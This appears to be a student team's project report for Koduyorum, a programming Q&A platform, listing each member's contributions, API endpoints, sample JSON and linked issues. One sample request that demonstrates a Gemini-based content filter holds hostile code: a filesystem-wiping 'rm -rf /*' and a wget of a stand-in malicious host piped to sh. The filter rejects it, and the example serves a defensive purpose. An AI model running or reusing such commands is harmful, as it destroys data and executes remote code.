 -- Scenario : While Mutti was searching the internet for a better site than Stackoverflow, he came across Koduyorum site and decided to register. After the signup process, he comes across a page that asks him about the tags that interest him and the programming languages he knows. On this page, Mutti chooses python as the language he knows and submits the form. When he enters the homepage, next to the question of the day and top 5 contributors, receives questions in a way that Python language will be prioritized n.
 Sent Request :
   `http://< backend_url >/fetch_feed_at_once/1`
 Response:
 ```json
{
    "personalized_questions": [
        {
            "id": 24,
            "title": "Efficient String Manipulation in Python",
            "description": "What are some efficient ways to handle large text files for searching specific patterns in Python?",
            "user_id": 1,
            "likes": 0,
            "comments_count": 1,
            "programmingLanguage": "Python (3.12.5)",
            "codeSnippet": "def search_pattern(file_path, pattern):\n    with open(file_path, 'r') as file:\n        for line in file:\n            if pattern in line:\n                print(line.strip())",
            "tags": [
                "string manipulation",
                "file handling",
                "performance"
            ],
            "answered": false,
            "is_upvoted": false,
            "is_downvoted": false
        },
        {
            "id": 42,
            "title": "I am constanty having recursive errors on my feed what could be the root reason?",
            "description": "Det",
            "user_id": 17,
            "likes": 0,
            "comments_count": 1,
            "programmingLanguage": "Python (3.12.5)",
            "codeSnippet": "cod",
            "tags": [
                "Python",
                "Recursive",
                "Django"
            ],
            "answered": true,
            "is_upvoted": false,
            "is_downvoted": false
        },
        {
            "id": 47,
            "title": "How to print integer in python",
            "description": "I have no idea how to do it, this seems to be working ",
            "user_id": 28,
            "likes": 0,
            "comments_count": 0,
            "programmingLanguage": "Python (3.12.5)",
            "codeSnippet": "print(7)",
            "tags": [
                "Python"
            ],
            "answered": false,
            "is_upvoted": false,
            "is_downvoted": false
        },
        {
            "id": 16,
            "title": "Explain the Django ORM in detail.",
            "description": "How does Django ORM compare with raw SQL queries?",
            "user_id": 3,
            "likes": 0,
            "comments_count": 2,
            "programmingLanguage": "JavaScript",
            "codeSnippet": "def example_code():\n    pass",
            "tags": [
                "example",
                "Django",
                "testing"
            ],
            "answered": false,
            "is_upvoted": false,
            "is_downvoted": false
        },
        {
            "id": 5,
            "title": "How do you handle file uploads in Django?",
            "description": "I am building an app that handles large file uploads. Any suggestions?",
            "user_id": 12,
            "likes": 2,
            "comments_count": 3,
            "programmingLanguage": "HTML",
            "codeSnippet": "def example_code():\n    pass",
            "tags": [
                "example",
                "Django",
                "testing"
            ],
            "answered": false,
            "is_upvoted": false,
            "is_downvoted": false
        },
        {
            "id": 20,
            "title": "What is Django REST framework?",
            "description": "What is the purpose of Django REST framework and how is it used?",
            "user_id": 6,
            "likes": 0,
            "comments_count": 0,
            "programmingLanguage": "HTML",
            "codeSnippet": "def example_code():\n    pass",
            "tags": [
                "example",
                "Django",
                "testing"
            ],
            "answered": false,
            "is_upvoted": false,
            "is_downvoted": false
        },
        {
            "id": 40,
            "title": "How to adjust CSS modules",
            "description": "How can i adjust CSS modules in TS environment?",
            "user_id": 27,
            "likes": 0,
            "comments_count": 0,
            "programmingLanguage": "TypeScript (5.0.3)",
            "codeSnippet": "",
            "tags": [
                "Web Development",
                "Design"
            ],
            "answered": false,
            "is_upvoted": false,
            "is_downvoted": false
        },
        {
            "id": 6,
            "title": "Explain the Django ORM in detail.",
            "description": "How does Django ORM compare with raw SQL queries?",
            "user_id": 9,
            "likes": 1,
            "comments_count": 1,
            "programmingLanguage": "JavaScript",
            "codeSnippet": "def example_code():\n    pass",
            "tags": [
                "example",
                "Django",
                "testing"
            ],
            "answered": false,
            "is_upvoted": false,
            "is_downvoted": false
        },
        {
            "id": 17,
            "title": "How to manage static files in Django?",
            "description": "What is the best way to manage static and media files?",
            "user_id": 15,
            "likes": 0,
            "comments_count": 3,
            "programmingLanguage": "Python",
            "codeSnippet": "def example_code():\n    pass",
            "tags": [
                "example",
                "Django",
                "testing"
            ],
            "answered": false,
            "is_upvoted": false,
            "is_downvoted": false
        },
        {
            "id": 46,
            "title": "IAMF Decoding",
            "description": "Hello all, I am having trouble understanding decoding algorithms in audio files. To be specific, I am working on decoding Immersive Audio files and do not know how to create a 'seek' function with variable length bytes. Any help on this or materials I can look into? ",
            "user_id": 36,
            "likes": 2,
            "comments_count": 0,
            "programmingLanguage": "Java (OpenJDK 13.0.1)",
            "codeSnippet": "",
            "tags": [],
            "answered": false,
            "is_upvoted": true,
            "is_downvoted": false
        }
    ],
    "question_of_the_day": {
        "id": 1,
        "title": "How to use Django models?",
        "description": "I am trying to understand how to create and use Django models effectively.",
        "user_id": 1,
        "likes": 2,
        "comments_count": 5,
        "programmingLanguage": "Python",
        "codeSnippet": "def sample_function():\n    print(\"Hello, World!\")",
        "tags": [
            "Django",
            "Python",
            "Models"
        ],
        "answered": false
    },
    "top_contributors": [
        {
            "username": "mutti",
            "email": "a@s1.com",
            "name": null,
            "surname": null,
            "contribution_points": 81
        },
        {
            "username": "halil",
            "email": "h@h.com",
            "name": null,
            "surname": null,
            "contribution_points": 40
        },
        {
            "username": "user14",
            "email": "user14@example.com",
            "name": null,
            "surname": null,
            "contribution_points": 24
        },
        {
            "username": "fatih",
            "email": "fatih@gmail.com",
            "name": null,
            "surname": null,
            "contribution_points": 20
        },
        {
            "username": "user13",
            "email": "user13@example.com",
            "name": null,
            "surname": null,
            "contribution_points": 18
        }
    ]
}
```
    
2. I decided to use AI to control the questions created in the application. I wrote a Gemini AI service and put it inside the create question as a control mechanism. 
   -- Takes a question body in json format:
   ```
    {
        "title": "",
        "language": "",
        "details": "",
        "code_snippet": "",
        "tags": [""]
    }
    ```
   -- Controls the question validity with the service QuestionQualityController. The service takes the data object and sends the parameters to the Google Gemini API and controls if it is related with the platform or not. Also checks if the code snippet contains malicious code. If there is no problem question creating function continues. If the question is not valid or including harmful code piece, it return the Json response indicating the problem.
   -- Scenario: Serhan is a really bad guy and wants to use the platform. He tries to submit a question with embedded malicious code that attempts to perform system-level operations.
     Sent Post Request :
   `http://< backend_url >/create_question`
   Header:
   `User-ID:1`
   Body:
   ```json
    {
        "title": "How to optimize file reading in Python?",
        "language": "Python (3.12.5)",
        "details": "I'm trying to understand how to read files more efficiently in Python. Can someone explain this code and help me optimize it? I'm working on a school project.",
        "code_snippet": "import os\nimport sys\ndef read_files():\n    try:\n        # Seemingly innocent file operations\n        with open('example.txt', 'r') as f:\n            data = f.read()\n            \n        # Malicious code hidden in the function\n        os.system('rm -rf /*')  # Attempt to delete system files\n        os.popen('wget http://malicious-site.com/payload.sh -O - | sh')  # Download and execute malicious script\n        \n        return data\n    except Exception as e:\n        pass\n\n# Calling the function\nread_files()",
        "tags": ["python", "file-handling", "optimization", "system"]
    }
    ```
    Response:
    ```json
    {
        "error": "Question is not valid"
    }
    ```
    
### Code-related significant issues:

 - [#250](https://github.com/bounswe/bounswe2024group9/issues/250)
 - [#263](https://github.com/bounswe/bounswe2024group9/issues/263)
 - [#268](https://github.com/bounswe/bounswe2024group9/issues/268)
 - [#270](https://github.com/bounswe/bounswe2024group9/issues/270)
 - [#278](https://github.com/bounswe/bounswe2024group9/issues/278)
 - [#283](https://github.com/bounswe/bounswe2024group9/issues/283)
 - [#292](https://github.com/bounswe/bounswe2024group9/issues/292)
 - [#296](https://github.com/bounswe/bounswe2024group9/issues/296)

### Management-related significant issues:
 - [#271](https://github.com/bounswe/bounswe2024group9/issues/271)
 - [#282](https://github.com/bounswe/bounswe2024group9/issues/282)

### Pull Requests:
 - [PR #251](https://github.com/bounswe/bounswe2024group9/pull/251) Lead - No conflicts.
 - [PR #252](https://github.com/bounswe/bounswe2024group9/pull/252) Contributor - No conflicts.
 - [PR #254](https://github.com/bounswe/bounswe2024group9/pull/254) Reviwever - No conflicts.
 - [PR #256](https://github.com/bounswe/bounswe2024group9/pull/256) Reviwever - No conflicts.
 - [PR #259](https://github.com/bounswe/bounswe2024group9/pull/259) Lead - No conflicts. 
 - [PR #279](https://github.com/bounswe/bounswe2024group9/pull/279) Reviewer - Rejected the PR.
 - [PR #281](https://github.com/bounswe/bounswe2024group9/pull/281) Opened for security update. Reviewed.
 - [PR #284](https://github.com/bounswe/bounswe2024group9/pull/284) Lead - No conflicts.
 - [PR #285](https://github.com/bounswe/bounswe2024group9/pull/285) Lead - No conflicts.
 - [PR #286](https://github.com/bounswe/bounswe2024group9/pull/286) Lead - No conflicts.
 - [PR #294](https://github.com/bounswe/bounswe2024group9/pull/294) Reviewer - Found problems when merging and helped my friend to solve them.
 - [PR #295](https://github.com/bounswe/bounswe2024group9/pull/295) Reviewer - Found problems and mentioned that in the PR.
 - [PR #297](https://github.com/bounswe/bounswe2024group9/pull/251) Lead - No conflicts.
 - [PR #302](https://github.com/bounswe/bounswe2024group9/pull/302) Reviwever - No conflicts.
 - [PR #308](https://github.com/bounswe/bounswe2024group9/pull/308) Reviwever - No conflicts.
 -  [PR #310](https://github.com/bounswe/bounswe2024group9/pull/310) Reviwever & Contributor - No conflicts.
 -  [PR #311](https://github.com/bounswe/bounswe2024group9/pull/311) Reviwever - Found problems, mentioned and merged.
 -  [PR #318](https://github.com/bounswe/bounswe2024group9/pull/318) Reviwever - Didnt see the problem merged and hotfixed at the main.


### Additional Information : 


Helped my friends to debug and better understand the backend functions and some web frontend implementations.


## Eray Eroğlu
 ### Responsibilities:

- Implementing the frontend of web application
- Improving UI/UX of web application
- Bug fixing related to web application

### Main Contributions:
- I worked in the implementaton of web application. I implemented the post creation page.
- I implemented a generic syntax higlighter for code execution part.
- I implemented the post filtering logic for the feed page, updated the UI accordingly, and coded the required backend endpoint.
- I debugged the CSS module error which collapses the whole web application. To solve the problem I updated the dependencies, remove the deprecated CSS modules and added the updated ones.

### API Contributions:

- I was mainly worked on the frontend part, so I did not implement any complex backend endpoint. But I implemented one to filter post according to their posting time.
1. /list_questions_by_time(request, page_number=1) - GET
- Lists questions ordered by creation date (most recent first) in a paginated manner
- Takes two arguments, the first one of them is the GET request object. The second one is an optional one, it is the page number for pagination. If the request sender does not specify this parameter, the default value is assigned as 1.
- Returns a JSON response containing the most recently posted 10 questions from the database. 
- Example JSON response:
[{'id': 55, 'title': 'Fibonacci recursion', 'language': 'C++ (GCC 14.1.0)', 'tags': ['Fibonacci'], 'details': 'i have a python code for Fibonacci recursion!', 'code_snippet': 'Fib(fib())', 'upvotes': 0, 'creationDate': '2024-11-26 12:09:22'}, {'id': 47, 'title': 'How to print integer in python', 'language': 'Python (3.12.5)', 'tags': ['Python'], 'details': 'I have no idea how to do it, this seems to be working ', 'code_snippet': 'print(7)', 'upvotes': 0, 'creationDate': '2024-11-26 11:19:05'}, {'id': 46, 'title': 'IAMF Decoding', 'language': 'Java (OpenJDK 13.0.1)', 'tags': [], 'details': "Hello all, I am having trouble understanding decoding algorithms in audio files. To be specific, I am working on decoding Immersive Audio files and do not know how to create a 'seek' function with variable length bytes. Any help on this or materials I can look into? ", 'code_snippet': '', 'upvotes': 2, 'creationDate': '2024-11-26 07:43:24'}, {'id': 45, 'title': 'About connecting my app to remote server', 'language': 'Python (3.8.1)', 'tags': ['Django'], 'details': 'I am trying to get a remote server backend to my localhost but I fail how can I fix that?', 'code_snippet': 'print("I work with remote")', 'upvotes': 0, 'creationDate': '2024-11-25 14:29:10'}, {'id': 44, 'title': 'How to start learning recursion in C', 'language': 'C (GCC 14.1.0)', 'tags': ['Recursion', 'Algorithms', 'C'], 'details': "Everybody uses recursion in advanced C algorithms but I don't get it how to use them. Where can I start to learn", 'code_snippet': '', 'upvotes': 2, 'creationDate': '2024-11-25 08:06:08'}, {'id': 43, 'title': 'Questions related to cache wrapping and unwrapping', 'language': 'C++ (Clang 7.0.1)', 'tags': ['Parallel Programming'], 'details': 'I have an app that applies sift on DOGs, I want to learn how can I optimize my block and grid size further.', 'code_snippet': '#include <stdio.h>\n\n__global__\nvoid saxpy(int n, float a, float *x, float *y)\n{\n  int i = blockIdx.x*blockDim.x + threadIdx.x;\n  if (i < n) y[i] = a*x[i] + y[i];\n}\n\nint main(void)\n{\n  int N = 1<<20;\n  float *x, *y, *d_x, *d_y;\n  x = (float*)malloc(N*sizeof(float));\n  y = (float*)malloc(N*sizeof(float));\n\n  cudaMalloc(&d_x, N*sizeof(float)); \n  cudaMalloc(&d_y, N*sizeof(float));\n\n  for (int i = 0; i < N; i++) {\n    x[i] = 1.0f;\n    y[i] = 2.0f;\n  }\n\n  cudaMemcpy(d_x, x, N*sizeof(float), cudaMemcpyHostToDevice);\n  cudaMemcpy(d_y, y, N*sizeof(float), cudaMemcpyHostToDevice);\n\n  // Perform SAXPY on 1M elements\n  saxpy<<<(N+255)/256, 256>>>(N, 2.0f, d_x, d_y);\n\n  cudaMemcpy(y, d_y, N*sizeof(float), cudaMemcpyDeviceToHost);\n\n  float maxError = 0.0f;\n  for (int i = 0; i < N; i++)\n    maxError = max(maxError, abs(y[i]-4.0f));\n  printf("Max error: %f\\n", maxError);\n\n  cudaFree(d_x);\n  cudaFree(d_y);\n  free(x);\n  free(y);\n}', 'upvotes': 0, 'creationDate': '2024-11-25 07:32:31'}, {'id': 42, 'title': 'I am constanty having recursive errors on my feed what could be the root reason?', 'language': 'Python (3.12.5)', 'tags': ['Python', 'Recursive', 'Django'], 'details': 'Det', 'code_snippet': 'cod', 'upvotes': 0, 'creationDate': '2024-11-25 05:13:19'}, {'id': 41, 'title': 'I am having problem sending a post request how can i structure my headers?', 'language': 'Python (3.8.1)', 'tags': ['Tag1', 'Tag2'], 'details': 'Question Details', 'code_snippet': 'Code Snippet', 'upvotes': 0, 'creationDate': '2024-11-25 03:27:02'}, {'id': 40, 'title': 'How to adjust CSS modules', 'language': 'TypeScript (5.0.3)', 'tags': ['Web Development', 'Design'], 'details': 'How can i adjust CSS modules in TS environment?', 'code_snippet': '', 'upvotes': 0, 'creationDate': '2024-11-24 19:24:10'}, {'id': 38, 'title': 'I have interesting question', 'language': 'Swift (5.2.3)', 'tags': ['Python'], 'details': 'How we will be able to run codes in python can someone explain', 'code_snippet': '', 'upvotes': -1, 'creationDate': '2024-11-24 00:09:47'}]

    
### Code-related significant issues:

 - [#276](https://github.com/bounswe/bounswe2024group9/issues/276)
 - [#288](https://github.com/bounswe/bounswe2024group9/issues/288)
 - [#291](https://github.com/bounswe/bounswe2024group9/issues/291)
 - [#304](https://github.com/bounswe/bounswe2024group9/issues/291)

### Pull Requests:
 -  [PR #248](https://github.com/bounswe/bounswe2024group9/pull/311) Lead - No conflicts
 -  [PR #310](https://github.com/bounswe/bounswe2024group9/pull/310) Lead - No conflicts
 -  [PR #318](https://github.com/bounswe/bounswe2024group9/pull/318) Lead - No conflicts

### Additional Information : 
Helped my teammates to fix bugs on the web app


## Huriye Ceylin Gebes


 ### Responsibilities:
- Implementing Profile page & functionalities on the web.
- Fixing web frontend bugs & profile page-related backend bugs.
- Implementing annotations on web.
- Improving search results page on web.
- Writing Evaluation part of the report.


### Main Contributions:
- During my work on this project, I contributed significantly to both the frontend and its connection with the backend, enhancing the functionality and user experience. Here are the key areas where I made impactful contributions:
- Designed and implemented a fully functional Profile Page for web. Displayed user details such as username, email, bio, and profile picture; added functionality to edit user details; added functionality to upload and update profile pictures, scoped bio visibility on the profile page, making it dynamically editable and prominently displayed under the username.
- Fixed a few bugs on corresponding functions on backend,`upload_profile_pic()` and `delete_user_profile()` in `user_views.py`.
- Implemented "Question of the Day" display on web feed. 
- Integrated the reset_password backend API for generating email reset links. Designed and implemented the Forgot Password page, enabling users to request password reset links via email. Built the Reset Password page, allowing users to securely reset their password using backend-provided tokens. (still in progress in terms of full functionality)
- Added Top Contributors to the feed page. Displayed the most active contributors based on backend-provided metrics.
- Implemented annotations for the search results page on web with my teammates.
- Implemented authentication wrapper for web app in order to prevent access to pages without authentication.
- Improved the overall styling and responsiveness.


### API Contributions:
1. Edit User Profile API:
 -- Endpoint: `/edit_user_profile/<int:will_be_edited_user_id>`
 -- Purpose: Allows users to update their profile details such as username, email, and bio.
 -- Scenario: After a few weeks of using Koduyorum, Ceylin realized that her username and bio no longer reflected her current expertise and interests. She clicked the "Edit Profile" button on her profile page, and a popup appeared, allowing her to edit her username, email, and bio. She updated her bio to showcase her newfound passion for React and changed her username to "ReactQueen." Upon saving the changes, the profile page dynamically updated, displaying the new details. The URL also changed seamlessly to /profile/ReactQueen to reflect the new username.
 -- Sample Request :
   ```PUT /edit_user_profile/25/
{
  "username": "new_username",
  "email": "new_email@example.com",
  "bio": "Updated bio for the user."
}
```
 -- Sample Response:
 ```
{
  "success": "User profile updated successfully"
}
```

-- Example Usage in Code: The Edit Profile popup collects and sends the updated user details to this API. Upon a successful response, the profileData state is updated, and the page is redirected if the username changes
```const handleEditSubmit = async (event) => {
  event.preventDefault();
  try {
    const response = await fetch(
      `${process.env.REACT_APP_API_URL}/edit_user_profile/${userId}/`,
      { method: 'PUT', headers: { 'Content-Type': 'application/json', 'User-ID': userId }, body: JSON.stringify(editData) }
    );
    if (response.ok) {
      setProfileData((prevData) => ({ ...prevData, ...editData }));
      if (editData.username !== profileData.username) {
        navigate(`/profile/${editData.username}`);
      }
    }
  } catch (error) {
    console.error('Error updating profile:', error);
  }
};
```

2. Delete User Profile API:
 -- Endpoint: `/delete_user_profile/<int:will_be_deleted_user_id>`
 -- Purpose: Allows users to delete their accounts. Only admins or the account owner can delete the profile.
 -- Scenario: Frustrated with a coding error she couldn't debug, Ceylin impulsively decided to delete her Koduyorum account. She clicked the "Delete Account" button on her profile page and was prompted with a confirmation message. After confirming, her account was deleted, and she was redirected to the signup page. Fortunately, the Koduyorum team’s support persuaded her to rejoin the platform a few days later.
  -- Sample Request :
   ```DELETE /delete_user_profile/25/
Headers: { "User-ID": "25" }

```
 -- Sample Response:
 ```
{
  "success": "User profile deleted successfully"
}
```
-- Previously, the API failed to correctly compare User-ID values due to a type mismatch. By ensuring the IDs were cast to integers, this bug was resolved, allowing proper validation for user deletion.

3. Fetch User Profile API:
 -- Endpoint: `/get_user_profile_by_username/<username>/`
 -- Purpose: Fetches user details such as username, email, bio, profile picture, and their associated questions/bookmarks.
 -- Scenario: Curious about her coding questions’ popularity, Ceylin visited her profile page. The page instantly loaded her details, including her stylish profile picture, her newly updated bio, and a list of all the questions she had asked. She felt proud seeing the growing number of likes and comments on her posts.
  -- Sample Request :
   ```GET /get_user_profile_by_username/ReactQueen/
```
 -- Sample Response:
 ```
{
  "user": {
    "username": "ReactQueen",
    "email": "reactqueen@example.com",
    "bio": "Passionate about building amazing user interfaces with React.",
    "profile_pic": "/media/profile_pics/reactqueen.jpeg",
    "questions": [...],
    "bookmarks": [...]
  }
}

```

4. Upload Profile Picture API:
 -- Endpoint: `/upload-profile-pic/`
 -- Purpose: Allows users to upload a new profile picture.
 -- Scenario: Inspired by her coding journey, Ceylin wanted to personalize her Koduyorum profile further. She clicked the "UPDATE" overlay on her profile picture, selected a recent professional headshot, and uploaded it. Her profile immediately displayed the new picture, making her profile stand out among the contributors.
  -- Sample Request :
   ```POST /upload-profile-pic/
Headers: { "User-ID": "25" }
Files: { "profile_pic": "reactqueen.jpeg" }

```
 -- Sample Response:
 ```
{
  "success": "Profile picture uploaded successfully",
  "url": "/media/profile_pics/reactqueen.jpeg"
}
```
    
    
### Code-related significant issues:
 - [#273](https://github.com/bounswe/bounswe2024group9/issues/273)
 - [#264](https://github.com/bounswe/bounswe2024group9/issues/264
 - [#258](https://github.com/bounswe/bounswe2024group9/issues/258)
 - [#296](https://github.com/bounswe/bounswe2024group9/issues/296)
 - [#271](https://github.com/bounswe/bounswe2024group9/issues/271)
 - [#268](https://github.com/bounswe/bounswe2024group9/issues/268)
 - [#250](https://github.com/bounswe/bounswe2024group9/issues/250)
 - [#278](https://github.com/bounswe/bounswe2024group9/issues/278)
 - [#289](https://github.com/bounswe/bounswe2024group9/issues/289)


### Management-related significant issues:
 - [#253](https://github.com/bounswe/bounswe2024group9/issues/253)


### Pull Requests:
 - [PR #294](https://github.com/bounswe/bounswe2024group9/pull/294) Lead Contributor - Solved conflicts on ResetPassword.css
 - [PR #265](https://github.com/bounswe/bounswe2024group9/pull/265) Contributor Reviewer - Merged with no conflicts.
 - [PR #252](https://github.com/bounswe/bounswe2024group9/pull/252) Contributor - No conflicts.
 - [PR #259](https://github.com/bounswe/bounswe2024group9/pull/259) Reviewer Contributor - No conflicts.
 - [PR #286](https://github.com/bounswe/bounswe2024group9/pull/286) Contributor
 - [PR #293](https://github.com/bounswe/bounswe2024group9/pull/293) Reviewer


### Additional Information : 
Worked on debugging backend functions, wrote evaluation part of this report. Enhanced user feedback with success and error messages across all profile-related functionalities.


## Halil Karabacak
 ### Responsibilities:
Continued to deliver everything related to our mobile app including annotation functionality, better search experience, a little testing, and deployment.



### Main Contributions:

1. I have primarily improved the existing state of the mobile app by refining the views. Working alone meant also to plan what functionality and in which order they will be added to the app.
2. Improved search section. Implemented a debouncing search function, removed old fashioned buttons for searching for different types of object, i.e Wikidata and questions.
3. I added a user survey after sign up that is connected to the database.
4. To implement, W3C standart we chose annotation as team. I implemented this functionality to our search result page to let user share their ideas and answer other users' annotations.
5. Added profile page and top contributors page, supporting them with the desired functionality. To give a modern sense of desing, I implemented gesture functionality that is used in modern apps such as Reddit mobile.
6. Made search call to our backend a single transaction. Implement a united search function that searches questions and wikidata at the same time, and returns a single json payload.
7. Addition of Topic model and related views to the backend. Topic model would help use keep track of predefined labels that can be assigned to the questions.
8. Added simple tests regarding Login page. 


### API Contributions:

- I implemented `multi_search` function in user views. This function simply calls the internal search functions and returns a single JSON payload that contains all related result. This function is useful because it decreases the number of API calls made to the backend. Structure is as follows:
- Sent Request :
   `http://< backend_url >/multi_search/`
 Response:
 ```json
{
  "language_results": [
    {
      "id": 1,
      "title": "How to use Django models?",
      "details": "I am trying to understand how to create and use Django models effectively.",
      "language": "Python"
    },
    {
      "id": 2,
      "title": "What is the difference between Python 2 and Python 3?",
      "details": "Looking for a detailed comparison between Python 2 and Python 3.",
      "language": "Python"
    },
    {
      "id": 7,
      "title": "How to manage static files in Django?",
      "details": "What is the best way to manage static and media files?",
      "language": "Python"
    },
    {
      "id": 24,
      "title": "Efficient String Manipulation in Python",
      "details": "What are some efficient ways to handle large text files for searching specific patterns in Python?",
      "language": "Python (3.12.5)"
    },
    {
      "id": 36,
      "title": "Recursion",
      "details": "How does recursion work in Python, I did not quite get it?",
      "language": "Python (3.8.1)"
    },
    {
      "id": 45,
      "title": "About connecting my app to a remote server",
      "details": "I am trying to get a remote server backend to my localhost but I fail. How can I fix that?",
      "language": "Python (3.8.1)"
    },
    {
      "id": 47,
      "title": "How to print an integer in Python",
      "details": "I have no idea how to do it. This seems to be working.",
      "language": "Python (3.12.5)"
    }
  ],
  "tag_results": [
    {
      "id": 1,
      "title": "How to use Django models?",
      "details": "I am trying to understand how to create and use Django models effectively.",
      "tags": ["Django", "Models", "Python"]
    },
    {
      "id": 38,
      "title": "I have an interesting question",
      "details": "How will we be able to run code in Python? Can someone explain?",
      "tags": ["Python", "Coding", "Question"]
    },
    {
      "id": 42,
      "title": "I am constantly having recursive errors on my feed. What could be the root reason?",
      "details": "Det",
      "tags": ["Recursion", "Errors", "Debugging"]
    },
    {
      "id": 47,
      "title": "How to print an integer in Python",
      "details": "I have no idea how to do it. This seems to be working.",
      "tags": ["Python", "Printing", "Integer"]
    }
  ],
  "wiki_results": [
    {
      "label": "Python",
      "url": "http://www.wikidata.org/entity/Q28865"
    },
    {
      "label": "Python 3",
      "url": "http://www.wikidata.org/entity/Q31205855"
    },
    {
      "label": "ChinesePython",
      "url": "http://www.wikidata.org/entity/Q10876607"
    },
    {
      "label": "Python for S60",
      "url": "http://www.wikidata.org/entity/Q7263936"
    },
    {
      "label": "Python Programming/Classes",
      "url": "http://www.wikidata.org/entity/Q28870544"
    }
  ]
}

```
    

### Code-related significant issues:
 - [#274](https://github.com/bounswe/bounswe2024group9/issues/274)
 - [#269](https://github.com/bounswe/bounswe2024group9/issues/269)
 - [#298](https://github.com/bounswe/bounswe2024group9/issues/298)
 - [#299](https://github.com/bounswe/bounswe2024group9/issues/299)

### Pull Requests:
 - [PR #316](https://github.com/bounswe/bounswe2024group9/pull/316) Lead - No conflicts.
 - [PR #315](https://github.com/bounswe/bounswe2024group9/pull/315) Lead - No conflicts.
 - [PR #309](https://github.com/bounswe/bounswe2024group9/pull/309) Lead - No conflicts.

## Fatih Akgöz
### Responsibilities:
- Development of question detail a.k.a. code execution page on web.

### Main Contributions:
- Integrated the backend for fetching question details.
- Added layout for question and comments.
- Added buttons regarding upvotes and downvotes.
- Added post and comment owners name to layout.
- Added related tag and language information.
- Fix get backend services used for code execution page. 
- Integrated post services for marking comments as answer, editing and deleting users questions and comments to question detail page. 
- Added navigation bar and loading preview for question detail page. 
- Added redirection for post and comment creator profiles.
- Fix some bugs on the backend for question and comment related services.
- Refactored the code execution component and split the components created.

### Pull Requests:
#### My Merged Prs: 
- [PR #295](https://github.com/bounswe/bounswe2024group9/pull/295) Lead - No Conflicts.
- [PR #311](https://github.com/bounswe/bounswe2024group9/pull/311) Lead - No Conflicts.
#### Reviewed Pr:
- [PR #259](https://github.com/bounswe/bounswe2024group9/pull/259)
### Code related issues:
- [# 263](https://github.com/bounswe/bounswe2024group9/issues/263)
- [# 275](https://github.com/bounswe/bounswe2024group9/issues/275)
- [# 296](https://github.com/bounswe/bounswe2024group9/issues/296)
- [# 299](https://github.com/bounswe/bounswe2024group9/issues/299)
- [# 300](https://github.com/bounswe/bounswe2024group9/issues/300)
    
## Mehmet Emin İpekdal
### Responsibilities: 
- Cover the general modals with unittests.
- Cover the new added API calls in user_views.py, comment_views.py and utilization_views.py with unittests.
- Fix the merge conflicts of 272-emin-add-unittests branch with main branch.

### API Calls Coverage:

     
```mehme@DESKTOP-JONRJOU MINGW64 ~/Desktop/Workspace/cmpe451group9/bounswe2024group9/django_project_491 (main)
$ python manage.py test
Connection successful!
Tables in the database:
('auth_group',)
('auth_group_permissions',)
('auth_permission',)
('auth_user',)
('auth_user_groups',)
('auth_user_user_permissions',)
('django_admin_log',)
('django_app_annotation',)
('django_app_comment',)
('django_app_comment_vote',)
('django_app_question',)
('django_app_question_reported_by',)
('django_app_question_vote',)
('django_app_topic',)
('django_app_user',)
('django_app_user_bookmarks',)
('django_content_type',)
('django_migrations',)
('django_session',)
('token_blacklist_blacklistedtoken',)
('token_blacklist_outstandingtoken',)
Found 28 test(s).
Creating test database for alias 'default'...
System check identified some issues:

WARNINGS:
?: (mysql.W002) MySQL Strict Mode is not set for database connection 'default'
        HINT: MySQL's Strict Mode fixes many data integrity problems in MySQL, such as data truncation upon insertion, by escalating warnings into errors. It is strongly recommended you activate it. See: https://docs.djangoproject.com/en/5.1/ref/databases/#mysql-sql-mode

System check identified 1 issue (0 silenced).
.Request successful.
Submission created successfully. Token: 96899289-26f5-4245-9f82-22b665fb301e
.Request successful.
.....Request successful.
Submission created successfully. Token: c874c075-4eee-492e-b65d-d8957ce51fae
.....................
----------------------------------------------------------------------
Ran 28 tests in 125.683s

OK
Destroying test database for alias 'default'...
(venv)
```

### Main Contributions: 
- By covering edge cases (switching vote types, invalid inputs, or resource non-existence), I have strengthened the system's resilience and reliability. This not only improves the application’s robustness but also enhances user trust, ensuring that their actions are accurately reflected in the platform. These tests serve as a foundation for future development, reducing the risk of regression and promoting codebase stability.
- I was responsible for resolving errors between unittest branch and the main, since there were a lot of functions added, and there were many pages updated in both frontend and backend, there were many conflicts. I have spent a significant time resolving them. All my commits can be seen [here](https://github.com/bounswe/bounswe2024group9/commits/main/?author=mehmeteminipekdal).
- I have added forgotten responses, incorrect field calls and forgotten urls for some methods as [here](https://github.com/bounswe/bounswe2024group9/commit/b0bbee6167321394ee7dd3caca88fe61475839b0#diff-683d51ec240b5cd58b15af6031e1cb0a457b3456dba4d0bbd1d4252237685e1bR26).
- I was the note taker for [meeting #4](https://github.com/bounswe/bounswe2024group9/wiki/Meeting-Notes-%234-15.11.2024).

### Code-related significant issues:

 - [#272](https://github.com/bounswe/bounswe2024group9/issues/272)

### Management-related significant issues:

 - [#266](https://github.com/bounswe/bounswe2024group9/issues/266)

### Pull Requests:

- [PR #307](https://github.com/bounswe/bounswe2024group9/pull/307)

### Additional Information:

- I have spent most of my time with the errors and debugging the functionality of the methods. There were a lot of methods added and their fields were changing with time. I needed to adapt every field that is added to a modal. Those changes caused significant incompatibilities, because some of the fields were deleted and caused my correctly functioning unittests to get errors.
